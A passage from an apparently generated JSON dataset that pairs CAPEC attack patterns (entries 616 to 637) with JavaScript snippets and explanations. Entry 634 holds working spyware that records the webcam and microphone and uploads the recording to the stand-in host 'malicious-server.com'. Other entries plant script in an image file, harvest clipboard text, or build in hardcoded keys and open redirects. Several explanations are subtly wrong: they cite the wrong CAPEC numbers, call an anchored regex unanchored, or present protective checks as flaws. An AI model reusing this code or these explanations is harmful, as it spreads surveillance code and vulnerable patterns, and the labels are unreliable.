        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user:password';\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login') {\n    // Transmitting sensitive data in cleartext\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sensitiveData);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, '0.0.0.0');\n\nconsole.log('Server running at http://0.0.0.0:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) on port 8080. When a request is made to the '/login' endpoint, it responds with sensitive data ('user:password') in cleartext. This embodies the main idea of the 'Evil Twin Wi-Fi Attack' (CAPEC-155) by demonstrating how sensitive information can be intercepted when transmitted over an insecure channel. The code also highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-940 (Improper Verification of Source of a Communication Channel). The server does not verify the identity of the client, nor does it ensure the integrity or confidentiality of the transmitted data, making it vulnerable to interception and manipulation by an adversary."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to read a configuration file\nfunction readConfig(configPath) {\n  // CWE-426: Untrusted Search Path\n  const fullPath = path.resolve(configPath);\n  if (!fs.existsSync(fullPath)) {\n    throw new Error('Configuration file not found');\n  }\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!fullPath.startsWith('/trusted/configs/')) {\n    throw new Error('Untrusted configuration file location');\n  }\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const configData = fs.readFileSync(fullPath, 'utf8');\n  return configData;\n}\n\n// Simulate reading a configuration file from an untrusted location\ntry {\n  const config = readConfig('/untrusted/configs/maliciousConfig.json');\n  console.log('Configuration:', config);\n} catch (error) {\n  console.error('Error:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary could establish a rogue location by providing a malicious configuration file. The `readConfig` function attempts to read a configuration file from a given path. It includes checks to prevent CWE-426 (Untrusted Search Path) by resolving the full path and CWE-940 (Improper Verification of Source of a Communication Channel) by ensuring the path starts with a trusted directory. If these checks fail, an error is thrown. The code also highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by reading and potentially exposing the contents of the configuration file. The simulated call to `readConfig` with an untrusted path demonstrates how an attacker could exploit this vulnerability if the checks were not in place."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // No verification of the source of the communication\n    socket.write('Message received');\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Client code to connect to the server\nconst client = net.createConnection({ port: 8080 }, () => {\n  console.log('Connected to server');\n  client.write('Hello, server!');\n});\n\nclient.on('data', (data) => {\n  console.log('Received from server:', data.toString());\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP server and client using the 'net' module. The server listens for incoming connections and processes data from clients without verifying the source of the communication. This lack of verification embodies the main idea of the CAPEC 'Cellular Rogue Base Station' attack, where an attacker can impersonate a legitimate base station. The related CWEs are represented by the server's failure to verify the source (CWE-940), allowing unauthorized access to the communication channel (CWE-300), and not ensuring message integrity (CWE-924). The code highlights the vulnerability of establishing a communication channel without proper verification and integrity checks."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "const sendBroadcastMessage = (phoneNumber, message) => {\n  // Simulate sending a broadcast message to a specific phone number\n  const cellTower = getCellTower(phoneNumber);\n  if (cellTower) {\n    // CWE-201: Insertion of Sensitive Information Into Sent Data\n    const broadcastMessage = `Broadcast to ${phoneNumber}: ${message}`;\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    transmitMessage(cellTower, broadcastMessage);\n  }\n};\n\nconst getCellTower = (phoneNumber) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // Simulate retrieving the cell tower for a given phone number\n  return 'CellTower123'; // In a real scenario, this would be dynamically determined\n};\n\nconst transmitMessage = (cellTower, message) => {\n  // CWE-300: Channel Accessible by Non-Endpoint\n  // Simulate transmitting a message to a cell tower\n  console.log(`Message sent to ${cellTower}: ${message}`);\n};\n\n// Example usage\nsendBroadcastMessage('123-456-7890', 'Test Alert');",
        "description": "This JavaScript code snippet simulates the process of sending a broadcast message to a mobile device based on its phone number, which is the main idea of the CAPEC 'Cellular Broadcast Message Request'. The function `sendBroadcastMessage` takes a phone number and a message, determines the cell tower associated with the phone number, and sends the broadcast message to that cell tower. The code includes vulnerabilities related to the CWEs mentioned: CWE-201 (sensitive information in the broadcast message), CWE-924 (no integrity check on the message), CWE-940 (no verification of the cell tower source), and CWE-300 (potential access by non-endpoints). This represents how an attacker could exploit these weaknesses to track the location of a mobile device."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\n// Simulated sensitive data\nconst sensitiveData = {\n  imsi: '123456789012345',\n  macAddress: '00:1A:2B:3C:4D:5E'\n};\n\n// Server to handle incoming requests\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!queryObject.source || queryObject.source !== 'trustedSource') {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Invalid source');\n    return;\n  }\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify(sensitiveData));\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet sets up an HTTP server that listens for incoming requests. It simulates the transmission of sensitive data, such as IMSI and MAC address, which can be used for tracking signal strength and identifying the source location of the signal. The code demonstrates CWE-940 by not properly verifying the source of the communication channel, allowing any request with a 'source' query parameter to access sensitive data. Additionally, it illustrates CWE-201 by including sensitive information in the response data. This setup represents the main idea of the CAPEC, where an attacker can exploit weaknesses in signal strength tracking and data transmission to identify and track the source location of a signal."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encrypt(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return { iv: iv.toString('hex'), encryptedData: encrypted };\n}\n\nfunction negotiateAlgorithm(clientPref, serverPref) {\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  const supportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\n  for (let alg of clientPref) {\n    if (serverPref.includes(alg) && supportedAlgorithms.includes(alg)) {\n      return alg;\n    }\n  }\n  return 'aes-128-cbc'; // Default to a less secure algorithm\n}\n\nconst clientAlgorithms = ['aes-128-cbc', 'aes-256-cbc'];\nconst serverAlgorithms = ['aes-128-cbc'];\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithms, serverAlgorithms);\n\nconst sensitiveData = 'This is some sensitive data.';\nconst encryptedData = encrypt(sensitiveData, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the encryption level to be lowered, making the encrypted data more vulnerable. The `negotiateAlgorithm` function simulates the negotiation process between a client and a server to select an encryption algorithm. Due to the server's limited support, the function defaults to a less secure algorithm (CWE-757). The `encrypt` function uses a hard-coded cryptographic key (CWE-321) to encrypt sensitive data. This combination of weaknesses illustrates the main idea of the CAPEC 'Drop Encryption Level' by showing how an attacker could exploit the negotiation process to enforce a weaker encryption algorithm, thereby compromising the security of the encrypted data."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    // Sending sensitive information in cleartext\n    client.write('username=admin&password=secret');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Simulate timing discrepancy based on data received\n    if (data.toString().includes('success')) {\n        setTimeout(() => client.destroy(), 100); // Short delay for success\n    } else {\n        setTimeout(() => client.destroy(), 500); // Longer delay for failure\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends sensitive information (username and password) in cleartext. This embodies CWE-319 (Cleartext Transmission of Sensitive Information). The code also introduces a timing discrepancy based on the server's response, representing CWE-208 (Observable Timing Discrepancy). If the response contains 'success', the client closes the connection after a short delay; otherwise, it waits longer. This timing difference can be observed and analyzed by an attacker, aligning with the CAPEC's main idea of analyzing packet timing and sizes to infer sensitive information."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendData(data) {\n  const key = '12345678901234567890123456789012'; // Weak key\n  const encryptedData = encryptData(data, key);\n  console.log('Sending data:', encryptedData);\n}\n\nconst sensitiveData = 'Sensitive Information';\nsendData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is encrypted using a weak cryptographic key and then transmitted. The `encryptData` function uses the AES-256-CBC algorithm with a hardcoded key, which is a risky practice (CWE-327). The `sendData` function logs the encrypted data to the console, simulating the transmission of sensitive information (CWE-201). This setup is vulnerable to electromagnetic side-channel attacks (CAPEC-201), as the weak key and improper protection mechanisms (CWE-1300) make it easier for an attacker to derive the key by monitoring electromagnetic emissions during the encryption process."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction sendData() {\n  // Simulate sending data over a network\n  console.log('Sending data: ' + sensitiveData);\n}\n\nfunction processButtonPress() {\n  // Simulate a button press that triggers data transmission\n  console.log('Button pressed');\n  sendData();\n}\n\n// Simulate a button press event\nprocessButtonPress();\n\n// Simulate physical side channel emissions\nfunction emitSound() {\n  console.log('Emitting sound: beep beep');\n}\n\nemitSound();",
        "description": "This JavaScript code snippet simulates a scenario where sensitive information (e.g., a user password) is transmitted over a network when a button is pressed. The code also simulates physical side channel emissions by emitting a sound when the button is pressed. This represents the CAPEC concept of 'Compromising Emanations Attack,' where an attacker could intercept and analyze unintentional signals (like sound emissions) to disclose sensitive information. The code also touches on related CWEs, such as the insertion of sensitive information into sent data (CWE-201) and improper protection of physical side channels (CWE-1300)."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "const crypto = require('crypto');\n\nfunction performSensitiveOperation() {\n  const secretKey = crypto.randomBytes(32);\n  const data = 'Sensitive Data';\n  const cipher = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction simulateFaultInjection() {\n  // Simulate a clock glitch by introducing a delay\n  setTimeout(() => {\n    console.log('Clock glitch simulated');\n    // Perform the sensitive operation during the glitch\n    const result = performSensitiveOperation();\n    console.log('Encrypted data:', result);\n  }, 1000);\n}\n\nsimulateFaultInjection();",
        "description": "This JavaScript code snippet demonstrates a simplified simulation of a hardware fault injection attack, specifically a clock glitch, on a cryptographic operation. The `performSensitiveOperation` function performs an AES-256-CBC encryption using a randomly generated secret key. The `simulateFaultInjection` function introduces a delay to simulate a clock glitch and then performs the sensitive operation during this glitch. This represents the main idea of CAPEC-188 (Hardware Fault Injection), where an adversary uses disruptive signals or events to cause faulty behavior in electronic devices, potentially compromising sensitive information. The code also touches on related CWEs, such as improper protection against voltage and clock glitches (CWE-1247) and improper handling of faults that lead to instruction skips (CWE-1332)."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "class MobileDevice {\n  constructor() {\n    this.secretKey = 'superSecretKey123';\n    this.voltage = 5; // in volts\n    this.clockSpeed = 2.5; // in GHz\n  }\n\n  performCryptographicOperation() {\n    // Simulate a cryptographic operation\n    if (this.voltage < 4.5 || this.clockSpeed < 2.0) {\n      throw new Error('Voltage or clock speed glitch detected!');\n    }\n    return this.secretKey;\n  }\n\n  // Simulate a fault injection attack\n  faultInjectionAttack() {\n    this.voltage = 4.0; // Lower the voltage to induce a fault\n    this.clockSpeed = 1.5; // Lower the clock speed to induce a fault\n    try {\n      const key = this.performCryptographicOperation();\n      console.log('Secret Key:', key);\n    } catch (error) {\n      console.error(error.message);\n    }\n  }\n}\n\nconst device = new MobileDevice();\ndevice.faultInjectionAttack();",
        "description": "This JavaScript code snippet simulates a mobile device that performs cryptographic operations. The `MobileDevice` class has properties for `secretKey`, `voltage`, and `clockSpeed`. The `performCryptographicOperation` method checks for voltage and clock speed glitches before returning the secret key. The `faultInjectionAttack` method simulates a fault injection attack by lowering the voltage and clock speed, causing the cryptographic operation to fail and potentially exposing the secret key. This code embodies the main idea of CAPEC-1247 by demonstrating how improper protection against voltage and clock glitches can lead to the compromise of sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "document.addEventListener('touchend', function(event) {\n  let touch = event.changedTouches[0];\n  let x = touch.pageX;\n  let y = touch.pageY;\n  console.log('Touch coordinates: (' + x + ', ' + y + ')');\n  // Simulate storing touch coordinates which could be used to infer patterns\n  localStorage.setItem('lastTouch', JSON.stringify({x: x, y: y}));\n});\n\n// Simulate a function that could be exploited to reveal touch patterns\nfunction revealPattern() {\n  let lastTouch = JSON.parse(localStorage.getItem('lastTouch'));\n  if (lastTouch) {\n    console.log('Last touch coordinates: (' + lastTouch.x + ', ' + lastTouch.y + ')');\n    // Potentially reveal sensitive information based on touch patterns\n  }\n}\n\n// Call the function to demonstrate potential vulnerability\nrevealPattern();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The 'touchend' event listener captures the coordinates of the user's touch and stores them in localStorage. The 'revealPattern' function retrieves these coordinates and logs them, simulating how an attacker might infer the user's password or passcode pattern based on touch data. This example highlights the vulnerability of improper protection of physical side channels (CWE-1300) and excessive attack surface (CWE-1125), as the touch data is easily accessible and can be exploited to reveal sensitive information."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "const gpsReceiver = (signal) => {\n  // CWE-940: No verification of the source of the signal\n  if (!verifySource(signal)) {\n    console.log('Warning: Unverified GPS signal source');\n  }\n\n  // CWE-924: No integrity check on the signal\n  if (!checkIntegrity(signal)) {\n    console.log('Warning: GPS signal integrity compromised');\n  }\n\n  // CWE-222: Truncation of security-relevant information\n  const truncatedSignal = truncateSignal(signal);\n  if (truncatedSignal.length < signal.length) {\n    console.log('Warning: GPS signal truncated');\n  }\n\n  // Process the signal (potentially spoofed)\n  const position = processSignal(truncatedSignal);\n  console.log(`Estimated Position: ${position}`);\n};\n\nconst verifySource = (signal) => {\n  // Placeholder for source verification logic\n  return false; // Simulating failure to verify source\n};\n\nconst checkIntegrity = (signal) => {\n  // Placeholder for integrity check logic\n  return false; // Simulating integrity check failure\n};\n\nconst truncateSignal = (signal) => {\n  // Placeholder for signal truncation logic\n  return signal.slice(0, signal.length - 1); // Simulating truncation\n};\n\nconst processSignal = (signal) => {\n  // Placeholder for signal processing logic\n  return 'Unknown Location'; // Simulating spoofed location\n};\n\n// Simulated incoming GPS signal\nconst incomingSignal = 'FAKE_GPS_SIGNAL';\ngpsReceiver(incomingSignal);",
        "description": "This JavaScript code snippet simulates a GPS receiver that processes incoming GPS signals. It embodies the main idea of the CAPEC 'Counterfeit GPS Signals' by demonstrating how an adversary could deceive the receiver with spoofed signals. The code includes checks for common weaknesses (CWEs) such as improper verification of the signal source (CWE-940), lack of message integrity checks (CWE-924), and truncation of security-relevant information (CWE-222). The `gpsReceiver` function processes an incoming signal without proper verification or integrity checks, leading to potential spoofing. The `verifySource`, `checkIntegrity`, and `truncateSignal` functions are placeholders that simulate failures in these checks, highlighting the vulnerabilities."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "const gpsReceiver = { currentLocation: { lat: 40.7128, lon: -74.0060 }, spoofed: false };\n\nfunction receiveGPSSignal(signal) {\n  if (verifySignalSource(signal.source)) {\n    gpsReceiver.currentLocation = signal.location;\n  } else {\n    console.warn('Unverified GPS signal source detected.');\n  }\n}\n\nfunction verifySignalSource(source) {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // This is a simplified and incorrect verification for demonstration purposes\n  return source === 'trustedSource';\n}\n\nfunction spoofGPSSignal() {\n  // CWE-290: Authentication Bypass by Spoofing\n  const spoofedSignal = { source: 'trustedSource', location: { lat: 34.0522, lon: -118.2437 } };\n  receiveGPSSignal(spoofedSignal);\n  gpsReceiver.spoofed = true;\n}\n\n// Simulate receiving a spoofed GPS signal\nspoofGPSSignal();\n\nconsole.log(gpsReceiver);",
        "description": "This JavaScript code snippet simulates a GPS spoofing attack, specifically a 'Carry-Off GPS Attack'. The `gpsReceiver` object represents a GPS receiver with an initial location. The `receiveGPSSignal` function updates the receiver's location if the signal source is verified. The `verifySignalSource` function is a simplified and incorrect implementation of source verification (CWE-940). The `spoofGPSSignal` function demonstrates an authentication bypass by spoofing (CWE-290) by sending a spoofed GPS signal with a trusted source. The code then simulates receiving this spoofed signal, updating the receiver's location to the spoofed coordinates, and marking the receiver as spoofed. This represents how an attacker can manipulate the GPS receiver's location by broadcasting counterfeit signals."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  // CWE-67: Improper Handling of Windows Device Names\n  if (filePath.includes('CON') || filePath.includes('AUX')) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-863: Incorrect Authorization\n  if (!isAuthorized(filePath)) {\n    throw new Error('Unauthorized access');\n  }\n\n  // CWE-772: Missing Release of Resource after Effective Lifetime\n  const file = fs.openSync(filePath, 'r');\n  try {\n    const data = fs.readFileSync(file, 'utf8');\n    console.log(data);\n  } finally {\n    fs.closeSync(file); // Ensure the file is closed after reading\n  }\n}\n\nfunction isAuthorized(filePath) {\n  // Simulate an authorization check\n  return filePath.startsWith('/user/');\n}\n\n// Example usage\ntry {\n  readFile('/user/data.txt');\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Unauthorized Use of Device Resources'. The function 'readFile' reads a file from the filesystem, but it includes checks to prevent common vulnerabilities. It checks for improper handling of Windows device names (CWE-67) by throwing an error if the file path contains 'CON' or 'AUX'. It performs an authorization check (CWE-863) to ensure the user is authorized to access the file. Finally, it ensures that the file resource is properly released after its effective lifetime (CWE-772) by closing the file in a 'finally' block. This code represents the main idea of preventing unauthorized use of device resources by incorporating proper validation and resource management."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "const trustedDomain = 'https://www.example.com';\nconst userInput = 'https://www.examp1e.com'; // User input with a typo\n\nfunction redirectToDomain(url) {\n  if (url.startsWith(trustedDomain)) {\n    window.location.href = url;\n  } else {\n    console.log('Redirecting to untrusted domain:', url);\n    // CWE-601: Open Redirect\n    window.location.href = url;\n  }\n}\n\nredirectToDomain(userInput);",
        "description": "This JavaScript code snippet demonstrates a TypoSquatting attack scenario. The trusted domain is 'https://www.example.com', but the user input contains a typo ('https://www.examp1e.com'). The function 'redirectToDomain' checks if the URL starts with the trusted domain. If it does, it redirects the user to that URL. If not, it logs a message and still redirects the user to the untrusted domain, illustrating CWE-601 (Open Redirect). This code snippet highlights the risk of TypoSquatting attacks where users can be redirected to malicious sites due to typos or unverified URLs."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "const trustedDomain = 'trusted.com';\nconst userInputDomain = 'trvsted.com'; // SoundSquatting domain\n\nfunction redirectToDomain(domain) {\n  if (domain === trustedDomain) {\n    window.location.href = `https://${domain}`;\n  } else {\n    console.log('Untrusted domain detected!');\n  }\n}\n\n// Simulate user input\nredirectToDomain(userInputDomain);",
        "description": "This JavaScript code snippet demonstrates a potential SoundSquatting attack. The trusted domain is 'trusted.com', but the user input domain is 'trvsted.com', which sounds similar but is spelled differently. The function `redirectToDomain` checks if the input domain matches the trusted domain and redirects the user if it does. However, if the domain does not match, it logs a message indicating an untrusted domain. This example highlights the risk of SoundSquatting attacks where users can be misled by similarly sounding domain names. The code also touches on CWE-601 (Open Redirect) by showing how user input can control redirection, and CWE-290 (Authentication Bypass by Spoofing) by demonstrating how a spoofed domain could bypass simple checks."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "const trustedDomain = 'example.com';\nconst userInput = 'examp1e.com'; // Homoglyph attack: '1' looks like 'l'\n\nfunction isTrustedDomain(input) {\n  const regex = /^example\\.com$/; // CWE-777: Regular Expression without Anchors\n  return regex.test(input);\n}\n\nif (isTrustedDomain(userInput)) {\n  console.log('Access granted to trusted domain.');\n} else {\n  console.log('Access denied.');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The trusted domain is 'example.com', but the user input is 'examp1e.com', where '1' is a homoglyph for 'l'. The function 'isTrustedDomain' uses a regular expression to check if the input matches the trusted domain. However, the regular expression is not properly anchored (CWE-777), which could allow malicious or malformed data to slip through. This code snippet highlights the risk of insufficient visual distinction of homoglyphs (CWE-1007) and the importance of proper input validation to prevent such attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// Secret key for JWT\nconst secretKey = 'supersecretkey';\n\n// Middleware to authenticate and generate token\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Weak authentication check\n  if (username === 'admin' && password === 'password') {\n    // Generate incorrect security token\n    const token = jwt.sign({ username: 'admin' }, secretKey, { expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Middleware to verify token and impersonate user\napp.use((req, res, next) => {\n  const token = req.headers['authorization'];\n  if (token) {\n    jwt.verify(token, secretKey, (err, decoded) => {\n      if (err) {\n        return res.status(401).send('Unauthorized');\n      } else {\n        // Improper restriction of security token assignment\n        req.user = decoded;\n        next();\n      }\n    });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Route that requires authentication\napp.get('/secure-data', (req, res) => {\n  if (req.user && req.user.username === 'admin') {\n    res.send('This is secure data for admin.');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that embodies the concept of 'Token Impersonation' as described in the CAPEC. The code includes a login route that performs weak authentication by checking for hardcoded credentials. Upon successful authentication, it generates a JWT token with a hardcoded secret key. The middleware then verifies the token and assigns the decoded user information to the request object. The '/secure-data' route checks if the user is 'admin' and returns secure data if the check passes. This code snippet highlights vulnerabilities such as weak authentication (CWE-1390), generation of incorrect security tokens (CWE-1270), and improper restriction of security token assignment (CWE-1259), which can be exploited for token impersonation attacks."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n\n// Function to capture audio and video using system's peripherals\nfunction captureMedia() {\n  exec('ffmpeg -f dshow -i video=\"Integrated Webcam\":audio=\"Microphone\" -t 00:00:10 output.mp4', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Function to send captured media to an external server\nfunction sendMedia() {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/octet-stream'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    console.log(`STATUS: ${res.statusCode}`);\n    console.log(`HEADERS: ${JSON.stringify(res.headers)}`);\n    res.setEncoding('utf8');\n    res.on('data', (chunk) => {\n      console.log(`BODY: ${chunk}`);\n    });\n    res.on('end', () => {\n      console.log('No more data in response.');\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`problem with request: ${e.message}`);\n  });\n\n  // Read the captured media file and send it\n  const readStream = fs.createReadStream('output.mp4');\n  readStream.on('open', () => {\n    readStream.pipe(req);\n  });\n  readStream.on('error', (err) => {\n    console.error(err);\n  });\n}\n\n// Capture media and send it\ncaptureMedia();\nsetTimeout(sendMedia, 15000);",
        "description": "This JavaScript code snippet demonstrates a malicious activity where the system's audio and video peripherals are exploited to capture sensitive information. The `captureMedia` function uses the `ffmpeg` command to record a 10-second video using the system's webcam and microphone. The `sendMedia` function then sends the captured media file to an external server. This code embodies the CAPEC 'Probe Audio and Video Peripherals' by capturing and transmitting sensitive information. The related CWEs are represented as follows: CWE-267 (Privilege Defined With Unsafe Actions) is implied by the use of system commands to access peripherals, CWE-319 (Cleartext Transmission of Sensitive Information) is shown by sending the media file over HTTP, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by unauthorized access to the media file, and CWE-1300 (Improper Protection of Physical Side Channels) is indirectly represented by the lack of protection mechanisms for the captured media."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(file) {\n  const allowedExtensions = ['.jpg', '.png', '.txt'];\n  const fileExtension = path.extname(file.name);\n\n  if (!allowedExtensions.includes(fileExtension)) {\n    throw new Error('Invalid file type');\n  }\n\n  const sanitizedFileName = path.basename(file.name);\n  const uploadPath = path.join(__dirname, 'uploads', sanitizedFileName);\n\n  fs.writeFile(uploadPath, file.data, (err) => {\n    if (err) throw err;\n    console.log('File uploaded successfully');\n  });\n}\n\n// Example usage\nconst file = {\n  name: 'example.jpg',\n  data: Buffer.from('file content')\n};\n\nuploadFile(file);",
        "description": "This JavaScript code snippet demonstrates a file upload function that checks the file extension to determine if the file type is allowed. It uses the 'path' module to sanitize the file name and constructs the upload path. The 'fs' module is then used to write the file to the specified path. The code aims to highlight the vulnerability described in CAPEC-162, where relying on file extensions can be deceptive. An attacker could potentially upload a file with a misleading extension to execute malicious code. The code also touches on CWE-646 by relying on the file extension to determine behavior, CWE-641 by constructing the file name from user input, and CWE-73 by allowing user input to influence the file path."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to hide malicious code in an image file's metadata\nfunction hideMaliciousCode(imagePath, maliciousCode) {\n  const imageData = fs.readFileSync(imagePath);\n  const hiddenData = Buffer.concat([imageData, Buffer.from(maliciousCode)]);\n  fs.writeFileSync(imagePath, hiddenData);\n}\n\n// Example usage\nconst imagePath = path.join(__dirname, 'example.jpg');\nconst maliciousCode = '<script>alert(\"Malicious Code\");</script>';\nhideMaliciousCode(imagePath, maliciousCode);\nconsole.log('Malicious code hidden in image metadata.');",
        "description": "This JavaScript code snippet demonstrates how an attacker might hide malicious code within the metadata of an image file. The `hideMaliciousCode` function reads the image file, appends the malicious code to the image data, and writes it back to the file. This embodies the CAPEC concept of hiding malicious data within files. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) is shown by embedding a script tag, CWE-219 (Storage of File with Sensitive Data Under Web Root) is implied if the image is stored in a web-accessible directory, CWE-313 (Cleartext Storage in a File or on Disk) and CWE-318 (Cleartext Storage of Sensitive Information in Executable) are represented by storing the malicious code in cleartext, and CWE-515 (Covert Storage Channel) is demonstrated by using the image file's metadata to covertly store the malicious code."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "document.addEventListener('copy', function(event) {\n  let clipboardData = event.clipboardData || window.clipboardData;\n  let sensitiveData = clipboardData.getData('text');\n  // Store sensitive data in cleartext in a variable\n  let storedData = sensitiveData;\n  // Log the sensitive data to the console (simulating exfiltration)\n  console.log('Sensitive data copied to clipboard:', storedData);\n});",
        "description": "This JavaScript code snippet listens for the 'copy' event, which is triggered when a user copies data to the clipboard. When the event occurs, it retrieves the copied data from the clipboard and stores it in a variable in cleartext. The code then logs this sensitive data to the console, simulating the exfiltration of clipboard contents by an unauthorized actor. This snippet embodies the main idea of CAPEC-Collect Data from Clipboard by demonstrating how an adversary can exploit clipboard functionality to gather sensitive information. The related CWEs are represented by storing and logging the sensitive data in cleartext, which can be accessed by unauthorized entities."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
